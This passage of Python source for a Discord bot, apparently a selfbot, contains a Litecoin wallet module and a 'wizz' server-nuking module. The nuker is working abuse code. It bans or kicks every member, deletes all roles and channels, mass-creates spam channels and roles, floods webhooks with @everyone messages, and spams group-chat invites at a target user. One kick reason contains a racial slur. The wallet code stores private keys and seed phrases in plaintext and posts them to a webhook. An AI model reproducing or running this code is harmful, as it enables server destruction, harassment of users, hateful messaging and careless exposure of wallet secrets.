            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"                
            f"<:wallet:1554761003869151252> | **Gen wallet** **:** **`{prefix}genltc [name]`**\n"
            f"<:wallet:1554761003869151252> | **wallet info** **:** **`{prefix}checkwallet [id|name]`**\n"
            f"<:wallet:1554761003869151252> | **Send LTC** **:** **`{prefix}pay [amount] [addy] [ID]`**\n"
            f"<:wallet:1554761003869151252> | **Check balance** **:** **`{prefix}bal [addy|ID|all]`**\n"
            f"<:wallet:1554761003869151252> | **Your LTC address** **:** **`{prefix}addy [ID]`**\n"
            f"<:wallet:1554761003869151252> | **LTC QR code** **:** **`{prefix}ltcqr`**\n"
            f"<:wallet:1554761003869151252> | **UPI QR code** **:** **`{prefix}upiqr [slot_no] [amnt]`**\n"
            f"<:wallet:1554761003869151252> | **Set UPI ID** **:** **`{prefix}setupi [slot_no.] [upi_id]`**\n"
            f"<:wallet:1554761003869151252> | **Show UPI ID** **:** **`{prefix}upi [slot_no.|all]`**\n"
            f"<:wallet:1554761003869151252> | **USD to INR** **:** **`{prefix}c2i [amount]`**\n"
            f"<:wallet:1554761003869151252> | **INR to USD** **:** **`{prefix}i2c [amount]`**\n"
            f"<:wallet:1554761003869151252> | **USD to EUR** **:** **`{prefix}c2e [amount]`**\n"
            f"<:wallet:1554761003869151252> | **EUR to USD** **:** **`{prefix}e2c [amount]`**\n"
            f"<:wallet:1554761003869151252> | **USD to LTC** **:** **`{prefix}u2l [amount]`**\n"
            f"<:wallet:1554761003869151252> | **LTC to USD** **:** **`{prefix}l2u [amount]`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )

        await send(ctx, "<:rocket1:1554756297143095346>__Wallet Commands__<a:crown:1554756538445336626>", description)

    @commands.command()
    async def setupi(self, ctx, slot_number: int, *, upi_id):
        await ctx.message.delete()
        if not upi_id:
            return await senderror(ctx, "Error", "Please provide a valid UPI ID.")
        if slot_number < 1:
            return await senderror(ctx, "Error", "Slot number must be greater than 0.")
        try:
            with open("database/upi.json", "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            data = {}
        data[str(slot_number)] = {"upi_id": upi_id}
        with open("database/upi.json", "w") as f:
            json.dump(data, f, indent=4)
        await send(ctx, "UPI ID", f"<:arrow:1554766539042062446> UPI ID **`{upi_id}`** has been saved under slot `{slot_number}`.")

    @commands.command()
    async def upi(self, ctx, slot_number_or_all: str):
        arg = slot_number_or_all
        await ctx.message.delete()
        try:
            with open("database/upi.json", "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            return await senderror(ctx, "Error", "No UPI IDs have been set. Use `!setupi <slot_number> <upi_id>` to set one.")
        if str(arg).lower() == "all":
            if not data:
                return await senderror(ctx, "Error", "No UPI IDs found.")
            upi_list = [f"**{slot}** : `{info.get('upi_id', 'N/A')}`" for slot, info in data.items()]
            upi_str = "\n".join(upi_list)
            return await send(ctx, "All UPI IDs", upi_str)
        if not str(arg).isdigit():
            return await senderror(ctx, "Error", "Please provide a valid slot number or use `all` to list all.")
        slot_number = str(arg)
        slot_data = data.get(slot_number)
        if not slot_data:
            return await senderror(ctx, "Error", f"No UPI ID found for slot `{slot_number}`. Set one using `!setupi {slot_number} <upi_id>`.")
        upi_id = slot_data.get("upi_id")
        if not upi_id:
            return await senderror(ctx, "Error", f"UPI ID for slot `{slot_number}` is missing or invalid.")
        await send(ctx, "UPI ID", f"{upi_id}")
        await ctx.send(upi_id)


    @commands.command(name="genltc")
    async def genltc(self, ctx, wallet_name: str):
        await ctx.message.delete()
        async with aiohttp.ClientSession() as session:
            headers = {
                "x-api-key": self.TATUM_API,
                "Content-Type": "application/json"
            }
            async with session.get("https://api.tatum.io/v3/litecoin/wallet", headers=headers) as resp:
                if resp.status != 200:
                    return await senderror(ctx, "Error", f"Tatum API Error (Wallet): {resp.status}")
                wallet_data = await resp.json()
            xpub = wallet_data['xpub']
            mnemonic = wallet_data['mnemonic']
            async with session.get(f"https://api.tatum.io/v3/litecoin/address/{xpub}/0", headers=headers) as resp:
                if resp.status != 200:
                    return await senderror(ctx, "Error", f"Tatum API Error (Address): {resp.status}")
                address_data = await resp.json()
            address = address_data['address']
            payload = {
                "mnemonic": mnemonic,
                "index": 0
            }
            async with session.post("https://api.tatum.io/v3/litecoin/wallet/priv", headers=headers, json=payload) as resp:
                if resp.status != 200:
                    return await senderror(ctx, "Error", f"Tatum API Error (PrivKey): {resp.status}")
                priv_data = await resp.json()
            private_key = priv_data['key']
        os.makedirs("database", exist_ok=True)
        if not os.path.exists("database/wallets.json"):
            with open("database/wallets.json", "w") as f:
                json.dump({}, f, indent=4)
        with open("database/wallets.json", "r") as f:
            wallets = json.load(f)
        if wallets:
            wallet_id = str(max(int(i) for i in wallets.keys()) + 1)
        else:
            wallet_id = "1"
        wallets[wallet_id] = {
            "id": int(wallet_id),
            "wallet_name": wallet_name,
            "mnemonic": mnemonic,
            "xpub": xpub,
            "address": address,
            "private_key": private_key
        }
        with open("database/wallets.json", "w") as f:
            json.dump(wallets, f, indent=4)
        with open("config.json", "r") as f:
            config = json.load(f)
        webhook_url = config.get("wallets_webhook_url")
        if webhook_url:
            embed = discord.Embed(title="🔐 New LTC Wallet Created", color=0x00ffcc)
            embed.add_field(name="ID", value=wallet_id, inline=False)
            embed.add_field(name="Name", value=wallet_name, inline=False)
            embed.add_field(name="Address", value=address, inline=False)
            embed.add_field(name="Secret Phrases", value=f"||{mnemonic}||", inline=False)
            embed.add_field(name="Private Key", value=f"||{private_key}||", inline=False)
            embed.add_field(name="Xpub", value=xpub, inline=False)
            embed.set_footer(text="Wallet data saved securely")

            wallet_txt = (
                f"Wallet ID: {wallet_id}\n"
                f"Name: {wallet_name}\n"
                f"Address: {address}\n"
                f"Mnemonic: {mnemonic}\n"
                f"Private Key: {private_key}\n"
                f"Xpub: {xpub}"
            )
            file_obj = StringIO(wallet_txt)
            file_obj.name = f"wallet_{wallet_id}.txt"
            webhook = discord.Webhook.from_url(webhook_url, client=ctx.bot)
            webhook_message = await webhook.send(embed=embed, file=discord.File(file_obj, filename=file_obj.name), wait=True)
        await send(ctx, "LTC Wallet Created ✅", f"**ID:** `{wallet_id}`\n**Name:** `{wallet_name}`\n**Address:** `{address}`\n**Private Key and Secret Phrases saved securely.**")
        if webhook_message:
            await ctx.send(f"**Wallet saved internally and {webhook_message.jump_url}**.")

    @commands.command(aliases=["checkwallet"])
    async def walletinfo(self, ctx, wallet_name_or_id: str):
        await ctx.message.delete()
        identifier = wallet_name_or_id
        with open("database/wallets.json", "r") as f:
            wallets = json.load(f)
        wallet_data = None
        if identifier.isdigit() and identifier in wallets:
            wallet_data = wallets[identifier]
        else:
            for data in wallets.values():
                if data['wallet_name'].lower() == identifier.lower():
                    wallet_data = data
                    break
        if not wallet_data:
            return await senderror(ctx, "Error", f"No wallet found for `{identifier}`.")
        confirmation_msg = await send(ctx, "LTC Wallet Details", f"**ID:** `{wallet_data['id']}`\n**Name:** `{wallet_data['wallet_name']}`\n**Address:** `{wallet_data['address']}`\n\nAre you sure you want to reveal the Private Key & Secret Phrases?\nReply `Yes` to confirm, or `No` to cancel.")
        try:
            user_response = await self.bot.wait_for(
                'message',
                check=lambda m: m.author == ctx.author and m.channel == ctx.channel,
                timeout=30
            )
            try:
                await user_response.delete()
            except:
                pass

            if user_response.content.lower() in ["yes", "y"]:
                await confirmation_msg.delete()
                await send(ctx, "LTC Wallet Info 🔐", f"**ID:** `{wallet_data['id']}`\n**Name:** `{wallet_data['wallet_name']}`\n**Address:** `{wallet_data['address']}`\n**Private Key:** `{wallet_data['private_key']}`\n**Secret Phrases:** `{wallet_data['mnemonic']}`")
            else:
                await confirmation_msg.delete()
                await send(ctx, "Canceled ❌", "The action has been canceled.")

        except asyncio.TimeoutError:
            await confirmation_msg.delete()
            await send(ctx, "Timeout ⏰", "No response received. Action canceled.")

    @commands.command(name="pay")
    async def pay(self, ctx, amount_usd: str, to_address: str, wallet_id: str):
        try:
            await ctx.message.delete()
        except:
            pass
        with open("database/wallets.json", "r") as f:
            wallets = json.load(f)
        with open("config.json", "r") as f:
            config = json.load(f)

        tatum_api_key = config.get("tatum_api_key")
        wallet_data = wallets.get(wallet_id)

        if not wallet_data:
            return await senderror(ctx, "Wallet Error", f"No wallet found with key `{wallet_id}`.")

        try:
            amount_usd = float(amount_usd)
            if amount_usd <= 0:
                return await senderror(ctx, "Invalid Amount", "USD amount must be greater than 0.")
        except ValueError:
            return await senderror(ctx, "Invalid Amount", "Enter a valid number for USD.")
        async with aiohttp.ClientSession() as session:
            async with session.get("https://min-api.cryptocompare.com/data/price?fsym=LTC&tsyms=USD") as res:
                if res.status != 200:
                    return await senderror(ctx, "Error", "Failed to fetch LTC price.")
                data = await res.json()
                ltc_price = data.get("USD")

        if not ltc_price:
            return await senderror(ctx, "Error", "Could not retrieve LTC price.")
        ltc_amount = round(amount_usd / ltc_price, 8)
        sender_address = wallet_data["address"]
        private_key = wallet_data["private_key"]
        confirmation = await send(
            ctx,
            "LTC Pay Confirmation <:alert:1554766730142941235>",
            f"**Amount:** {amount_usd:.2f} $ | {ltc_amount:.8f} LTC\n\n"
            f"**Sender's Address:**\n`{sender_address}`\n\n"
            f"**Receiver's Address:**\n`{to_address}`\n\n"
            "**`Send yes/y to confirm the payment`**\n**`Send no/n to cancel`**"
        )
        try:
            msg = await self.bot.wait_for(
                'message',
                timeout=30,
                check=lambda m: m.author == ctx.author and m.channel == ctx.channel
            )

            try:
                await msg.delete()
            except:
                pass
            if msg.content.lower() in ["yes", "y"]:
                await confirmation.delete()
                processing_msg = await send(ctx, "Processing Payment", "<a:loading:1554766893611749386> Processing...")

                payload = {
                    "fromAddress": [{
                        "address": sender_address,
                        "privateKey": private_key
                    }],
                    "to": [{
                        "address": to_address,
                        "value": ltc_amount
                    }],
                    "fee": "0.0001",
                    "changeAddress": sender_address
                }

                headers = {
                    "x-api-key": tatum_api_key,
                    "Content-Type": "application/json"
                }

                async with aiohttp.ClientSession() as session:
                    async with session.post("https://api.tatum.io/v3/litecoin/transaction", json=payload, headers=headers) as r:
                        res = await r.json()

                        try:
                            await processing_msg.delete()
                        except:
                            pass

                        if r.status == 200 and "txId" in res:
                            txid = res["txId"]
                            return await send(
                                ctx,
                                "LTC Sent <:GreenTick:1554767213825757234>",
                                f"**Amount:** {amount_usd:.2f} $ | {ltc_amount:.8f} LTC\n\n"
                                f"**Sender:** `{sender_address}`\n"
                                f"**Receiver:** `{to_address}`\n\n"
                                f"**[Transaction ID](https://litecoinspace.org/tx/{txid})**"
                            )
                        else:
                            return await senderror(ctx, "Tatum Error", f"Failed to send LTC.\n```{res}```")

            elif msg.content.lower() in ["no", "n"]:
                await confirmation.delete()
                return await senderror(ctx, "Canceled", "The payment has been canceled.")

            else:
                await confirmation.delete()
                return await senderror(ctx, "Invalid Input", "You must reply with `yes` or `no`.")

        except asyncio.TimeoutError:
            await confirmation.delete()
            return await senderror(ctx, "Timeout", "You took too long to respond. Action canceled.")

    @commands.command(aliases=['ltcbal', 'checkbal', 'getbal', 'balance', 'mybal'])
    async def bal(self, ctx, input: str = None):
        if not input:
            return await senderror(ctx, "Error", "Please provide a wallet ID or address or use \"all\" for all wallets.")
        await ctx.message.delete()


        with open("database/wallets.json", "r") as f:
            wallets = json.load(f)

        async with aiohttp.ClientSession() as session:
            
            async with session.get("https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd") as cg_response:
                if cg_response.status != 200:
                    return await ctx.send("Failed to fetch USD conversion rate.")
                usd_price = (await cg_response.json())['litecoin']['usd']


            if input == "all":
                response = ""
                for wallet_id, wallet_info in wallets.items():
                    address = wallet_info["address"]
                    balance_data = await self.fetch_balance_data(session, address)
                    if not balance_data:
                        continue
                    ltc_bal = balance_data['balance'] / 1e8
                    usd_bal = ltc_bal * usd_price
                    response += f"{address}\n- <:arrow:1554766539042062446> **Wallet ID:** {wallet_id}\n- <:arrow:1554766539042062446> **Balance:** {usd_bal:.2f} $ | {ltc_bal:.8f}\n\n"
                return await send(ctx,"LTC Balance",response or "No wallets found.")

            
            if input and (input.startswith("ltc1") or input.startswith("L")) or input.startswith("M") or input.startswith("3"):
                address = input
                wallet_id = "None"
            else:
                
                wallet_info = wallets.get(input)
                if not wallet_info:
                    return await ctx.send("Wallet ID not found.")
                address = wallet_info["address"]
                wallet_id = input

            balance_data = await self.fetch_balance_data(session, address)
            if not balance_data:
                return await ctx.send("Failed to retrieve wallet info.")

            ltc_bal = balance_data['balance'] / 1e8
            total_rec = balance_data['total_received'] / 1e8
            unconf = balance_data['unconfirmed_balance'] / 1e8

            usd_bal = ltc_bal * usd_price
            usd_total = total_rec * usd_price
            usd_unconf = unconf * usd_price

            msg = (
                f"{address}\n"
                f"- <:arrow:1554766539042062446> **Wallet ID:** {wallet_id}\n"
                f"- <:arrow:1554766539042062446> **Balance:** {usd_bal:.2f} $ | {ltc_bal:.8f}\n"
                f"- <:arrow:1554766539042062446> **Unconfirmed:** {usd_unconf:.2f} $ | {unconf:.8f}\n"
                f"- <:arrow:1554766539042062446> **Total Recvd:** {usd_total:.2f} $ | {total_rec:.8f}"
            )
            await send(ctx,"LTC Balance",msg)

    async def fetch_balance_data(self, session, address):
        try:
            async with session.get(f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance") as resp:
                if resp.status != 200:
                    return None
                return await resp.json()
        except:
            return None


    @commands.command()
    async def addy(self,ctx,wallet_id):
        await ctx.message.delete()  
        with open('database/wallets.json', 'r') as wallets_file:
            wallets = json.load(wallets_file) 
        wallet_data = wallets.get(wallet_id)
        if not wallet_data:
            return await senderror(ctx, "Error", f"No wallet found with ID `{wallet_id}`.")
        address = wallet_data["address"]
        await send(ctx, "LTC Address", f"<:arrow:1554766539042062446> **Address:** `{address}`\n<:arrow:1554766539042062446> **Wallet ID:** `{wallet_id}`")
        await ctx.send(address)       

    @commands.command()
    async def l2u(self,ctx,amount : str):
        await ctx.message.delete()
        try:
            amount = float(amount)
        except ValueError:
            return await senderror(ctx, "Error", "Please enter a valid number.")
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd") as cg_response:
                if cg_response.status != 200:
                    return await ctx.send("Failed to fetch USD conversion rate.")
                usd_price = (await cg_response.json())['litecoin']['usd']
        amount_in_usd = amount * usd_price
        await send(ctx, "Litecoin to USD", f"<a:ltc:1554767453177778217> Amount in LTC: {amount} LTC\n<:dollar:1554767609109676052> Amount in USD: {amount_in_usd:.2f} $")

    @commands.command()
    async def u2l(self,ctx,amount : str):
        await ctx.message.delete()
        try:
            amount = float(amount)
        except ValueError:
            return await senderror(ctx, "Error", "Please enter a valid number.")
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd") as cg_response:
                if cg_response.status != 200:
                    return await ctx.send("Failed to fetch USD conversion rate.")
                usd_price = (await cg_response.json())['litecoin']['usd']
        amount_in_ltc = amount / usd_price
        await send(ctx, "USD to Litecoin", f"<:dollar:1554767609109676052> Amount in USD: {amount} $\n<a:ltc:1554767453177778217> Amount in LTC: {amount_in_ltc:.8f} LTC")

    @commands.command(aliases=['c2i'])
    async def u2i(self, ctx, amount: str):
        await ctx.message.delete()
        usd_to_inr_rate = self.get_usd_to_inr_rate()
        if usd_to_inr_rate is None:
            await senderror(ctx, "Error", "Error fetching conversion rate, try again later")
            return
        amount_in_usd = float(amount)
        amount_in_inr = amount_in_usd * usd_to_inr_rate
        await send(ctx, "USD to INR", f"<:dollar:1554767609109676052> Amount in USD: {amount} $\n<:INR:1403265991613612093> Amount in INR: {amount_in_inr:.2f} ₹")

    @commands.command(aliases=['i2c'])
    async def i2u(self, ctx, amount: str):
        await ctx.message.delete()
        usd_to_inr_rate = self.get_usd_to_inr_rate()
        if usd_to_inr_rate is None:
            await senderror(ctx, "Error", "Error fetching conversion rate, try again later")
            return
        amount_in_inr = float(amount)
        amount_in_usd = amount_in_inr / usd_to_inr_rate
        await send(ctx, "INR to USD", f"<:INR:1403265991613612093> Amount in INR: {amount} ₹\n<:dollar:1554767609109676052> Amount in USD: {amount_in_usd:.2f} $")

    @commands.command(aliases=['c2e'])
    async def u2e(self, ctx, amount: str):
        await ctx.message.delete()
        usd_to_eur_rate = self.get_usd_to_eur_rate()
        if usd_to_eur_rate is None:
            await senderror(ctx, "Error", "Error fetching conversion rate, try again later")
            return
        amount_in_usd = float(amount)
        amount_in_eur = amount_in_usd * usd_to_eur_rate
        await send(ctx, "USD to EUR", f"<:dollar:1554767609109676052> Amount in USD: {amount} $\n<a:Europa:1403266322535809085> Amount in EUR: {amount_in_eur:.2f} €")

    @commands.command(aliases=['e2c'])
    async def e2u(self, ctx, amount: str):
        await ctx.message.delete()
        usd_to_eur_rate = self.get_usd_to_eur_rate()
        if usd_to_eur_rate is None:
            await senderror(ctx, "Error", "Error fetching conversion rate, try again later")
            return
        amount_in_eur = float(amount)
        amount_in_usd = amount_in_eur / usd_to_eur_rate
        await send(ctx, "EUR to USD", f"<a:Europa:1403266322535809085> Amount in EUR: {amount} €\n<:dollar:1554767609109676052> Amount in USD: {amount_in_usd:.2f} $")

    @commands.command(aliases=['ltcqr'])
    async def ltcqrcode(self, ctx,wallet_id):
        await ctx.message.delete()
        with open('database/wallets.json', 'r') as wallets_file:
            wallets = json.load(wallets_file) 
        wallet_data = wallets.get(wallet_id)
        if not wallet_data:
            return await senderror(ctx, "Error", f"No wallet found with ID `{wallet_id}`.")
        self.LTC_ADDRESS = wallet_data["address"]
        addy = self.LTC_ADDRESS
        try:
            qr = qrcode.QRCode(
                version=1,
                box_size=10, 
                border=5,
            )
            qr.add_data(addy)
            qr.make(fit=True)
            img = qr.make_image(fill="black", back_color="white")
            buffer = BytesIO()
            img.save(buffer, "PNG")
            buffer.seek(0)
            file = discord.File(buffer, filename="ltc_qr.png")
            await ctx.send(content=f"> **Here is the QR code for your LTC address**\n> ```{addy}```", file=file)
        except Exception as e:
            await ctx.send(f"An error occurred while generating the QR code: {e}")

    @commands.command(aliases=['upiqr'])
    async def upiqrcode(self, ctx,slot_number_or_all,amount : int):
        arg = slot_number_or_all
        await ctx.message.delete()
        try:
            with open("database/upi.json", "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            return await senderror(ctx, "Error", "No UPI IDs have been set. Use `!setupi <slot_number> <upi_id>` to set one.")
        slot_number = str(arg)
        slot_data = data.get(slot_number)
        if not slot_data:
            return await senderror(ctx, "Error", f"No UPI ID found for slot `{slot_number}`. Set one using `!setupi {slot_number} <upi_id>`.")
        upi_id = slot_data.get("upi_id")
        if not upi_id:
            return await senderror(ctx, "Error", f"UPI ID for slot `{slot_number}` is missing or invalid.")
        self.upi = upi_id
        upi = f"upi://pay?pa={self.upi}&pn=Unknown&tn=I authorise this Payment&am={amount}&cu=INR"
        try:
            qr = qrcode.QRCode(
                version=1,
                box_size=10, 
                border=5,
            )
            qr.add_data(upi)
            qr.make(fit=True)
            img = qr.make_image(fill="black", back_color="white")
            buffer = BytesIO()
            img.save(buffer, "PNG")
            buffer.seek(0)
            file = discord.File(buffer, filename="ltc_qr.png")
            await ctx.send(content=f"<:Hammer:1554767820288426045> **Here is the QR code for your UPI Id**\n> **`{self.upi}` with amount `{amount}`**", file=file)
        except Exception as e:
            await ctx.send(f"An error occurred while generating the QR code: {e}")

class wizz(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.api_base_url = "https://discord.com/api/v9"        
        self.webhooks = {}
        
    @commands.command()
    async def wizz(self, ctx):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        await ctx.message.delete()
        content = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"            
            f"<a:wizz:1554760593846833202> | **Full Nukez** **:** **`{prefix}kill`**\n"                    
            f"<a:wizz:1554760593846833202> | **Spam Roles (100)** **:** **`{prefix}massrole [name]`**\n"
            f"<a:wizz:1554760593846833202> | **Bans all users** **:** **`{prefix}banall`**\n"
            f"<a:wizz:1554760593846833202> | **Kicks all users** **:** **`{prefix}kickall`**\n"
            f"<a:wizz:1554760593846833202> | **Spam Text Channels** **:** **`{prefix}massch [name]`**\n"
            f"<a:wizz:1554760593846833202> | **Spam Voice channels** **:** **`{prefix}massvc [name]`**\n"
            f"<a:wizz:1554760593846833202> | **Deletes all roles** **:** **`{prefix}delroles`**\n"
            f"<a:wizz:1554760593846833202> | **Deletes all channels** **:** **`{prefix}delchannels`**\n"
            f"<a:wizz:1554760593846833202> | **Spam message** **:** **`{prefix}spam [times] [message]`**\n"
            f"<a:wizz:1554760593846833202> | **Spam mass GC** **:** **`{prefix}gcspam [userID] [count]`**\n"
            f"<a:wizz:1554760593846833202> | **Webhook spam** **:** **`{prefix}webspam [URL] [count] [msg]`**\n"
            f"<a:wizz:1554760593846833202> | **Delete webhook** **:** **`{prefix}webdel [URL]`**\n"
            f"<a:wizz:1554760593846833202> | **Nick all users** **:** **`{prefix}nickall [name]`**\n"             
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"           
            )
        await send(ctx, "<:rocket1:1554756297143095346>__Wizz Commands__<a:crown:1554756538445336626>", content,"USE ON YOUR OWN RISK")

    @commands.command()
    async def spam(self,ctx, times: int, *, message):
        await ctx.message.delete()
        for _ in range(times):
            await ctx.send(message) 

    @commands.command(name="massrole",aliases=['massroles','massr','spamroles','spamrole','spamr'])
    async def massrole(self, ctx, name: str):
        await ctx.message.delete()
        guild = ctx.guild
        for i in range(100):
            await guild.create_role(name=name)

    @commands.command(name="kickall", aliases=['kickwave'])
    async def kickall(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        author_id = ctx.author.id
        bot_id = self.bot.user.id
        members = await guild.fetch_members()
        for member in members:
            if member.id in [author_id, bot_id]:  
                continue
            try:
                await member.kick(reason="masskick HAHA")
            except Exception as e:
                print(f"Error kicking {member}: {e}")

        await ctx.send("<:arrow:1554766539042062446> Kicked all members from the server.")

    @commands.command(aliases=['massban','banwave'])
    async def banall(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        author_id = ctx.author.id
        bot_id = self.bot.user.id
        members = await guild.fetch_members()
        for member in members:
            if member.id in [author_id, bot_id]: 
                continue
            try:
                await member.ban(reason="massban HAHA")
            except Exception as e:
                print(f"Error kicking {member}: {e}")

        await ctx.send("<:arrow:1554766539042062446> banned all members from the server.")

    @commands.command(name="masschannel",aliases=['massch','chmass'])
    async def masschannel(self, ctx, name: str):
        await ctx.message.delete()
        guild = ctx.guild
        for i in range(100):
            await guild.create_text_channel(name=name)

    @commands.command(name="massvc")
    async def massvc(self, ctx, name: str):
        await ctx.message.delete()
        guild = ctx.guild
        for i in range(100):
            await guild.create_voice_channel(name=name)

    @commands.command(name="deleteroles",aliases=['delroles','delr'])
    async def deleteroles(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        for role in guild.roles:
            try:
                await role.delete()
            except:
                pass
        await ctx.send("**<:arrow:1554766539042062446> All roles has been deleted succesfully**")

    @commands.command(name="deletechannels",aliases=['delchannels','delch','channelsdel'])
    async def deletechannels(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass
            
    @commands.command()
    async def nickall(self, ctx, *, nickname: str):
        await ctx.message.delete()
        guild = ctx.guild
        if guild:
            for member in guild.members:
                if member != ctx.guild.owner and member != self.bot.user:
                    try:
                        await member.edit(nick=nickname)
                    except:
                        pass
            await ctx.send(f"<:arrow:1554766539042062446> **Changed everyone's nickname to {nickname}**")

    @commands.command()
    async def gcspam(self, ctx, user_id: int, count: int):
        await ctx.message.delete()

        token = self.bot.http.token
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
        }

        success = 0 
        
        async with aiohttp.ClientSession(headers=headers) as session:
            for _ in range(count):  
                payload = {"recipients": []}
                async with session.post("https://discord.com/api/v10/users/@me/channels", json=payload) as response:
                    if response.status == 200:
                        data = await response.json()
                        channel_id = data["id"]
                        add_payload = {"user_id": str(user_id)}
                        async with session.put(f"{self.api_base_url}/channels/{channel_id}/recipients/{user_id}", json=add_payload) as add_response:
                            if add_response.status == 204:
                                success += 1 
                                async with session.delete(f"{self.api_base_url}/channels/{channel_id}") as leave_response:
                                    if leave_response.status != 204:
                                        pass
        
        await ctx.send(f"**<:arrow:1554766539042062446> GC spam completed!** Created and left a total of **{success}** group chats.")

    @commands.command(aliases=['nukez','zzz'])
    async def kill(self, ctx):
        await ctx.message.delete()
        if not ctx.guild:
            return
        await ctx.send("**Are you sure you want to nuke the server?**\nType `y` to confirm or `n` to cancel.")
        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in ["y", "n"]
        try:
            msg = await self.bot.wait_for("message", timeout=15.0, check=check)
            if msg.content.lower() == "y":
                await ctx.send("**Nuke confirmed...!** ")
                await self.delete_all_channels(ctx.guild)
                await self.kick_all(ctx.guild)
                await self.delete_all_roles(ctx.guild)
                tasks = [self.create_channel(ctx.guild) for _ in range(50)]
                await asyncio.gather(*tasks)
            else:
                await ctx.send("❌ **Nuke canceled.**",delete_after=5)
        except asyncio.TimeoutError:
            await ctx.send("⏳ **Confirmation timed out.** Nuke canceled.",delete_after=5)        

    @commands.command(name="webhookspam", aliases=["wspam", "whspam","webspam","whookspam"])
    async def webhook_spam(self, ctx, url: str, times: int, *, message: str):
        if times <= 0:
            return await senderror(ctx,"Error","Pls give a positive number of counts")
        try:
            async with aiohttp.ClientSession() as session:
                for i in range(times):
                    async with session.post(url, json={"content": message}) as resp:
                        if resp.status != 204 and resp.status != 200:
                            return await senderror(ctx,"Failed", f"Failed at attempt {i+1}, status: {resp.status}")
            await send(ctx, "Webhook Spammer", f"Successfully sent message `{times}` times.")
        except Exception as e:
            await senderror(ctx,"Error", f"Something went wrong: {e}")

    @commands.command(name="webhookdelete", aliases=["wdel", "whdel","webdel","whookdel"])
    async def webhook_delete(self, ctx, url: str):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.delete(url) as resp:
                    if resp.status == 204:
                        await send(ctx, "Webhook Delete", "Webhook successfully deleted.")
                    else:
                        await senderror(ctx,"Error", f"Failed to delete webhook. Status: {resp.status}")
        except Exception as e:
            await senderror(ctx,"Error" ,f"Something went wrong: {e}")

    async def delete_all_channels(self, guild):
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass

    async def kick_all(self, guild):
        bot_id = self.bot.user.id
        members = await guild.fetch_members()
        for member in members:
            if member.id in [bot_id]:
                continue
            try:
                await member.kick(reason="GOOD BYE NIGERS")
            except Exception as e:
                pass

    async def delete_all_roles(self, guild):
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except discord.Forbidden:
                    print(f"Missing permissions to delete role {role.name}")
                except discord.HTTPException:
                    print(f"Rate-limited, waiting...")
                    await asyncio.sleep(5)

    async def create_channel(self, guild):
        with open('nuker.json', 'r') as config_file:
            config = json.load(config_file)         
        for _ in range(50):      
            try:
                webhook_name = random.choice(config["webhook_names"]) 
                channel_name = random.choice(config["channel_names"]) 
                ch = await guild.create_text_channel(name=channel_name)
                webhook = await ch.create_webhook(name=webhook_name)
                await self.spam_webhook(webhook)
            except discord.HTTPException:
                print(f"Rate-limited on creating channel, waiting...")
                await asyncio.sleep(5)

    async def spam_webhook(self, webhook):
        with open('nuker.json', 'r') as config_file:
            config = json.load(config_file)               
        for _ in range(30):
            try:
                message = random.choice(config["nuke_messages"]) 
                await webhook.send(f"@everyone @here {message}")
            except discord.HTTPException:
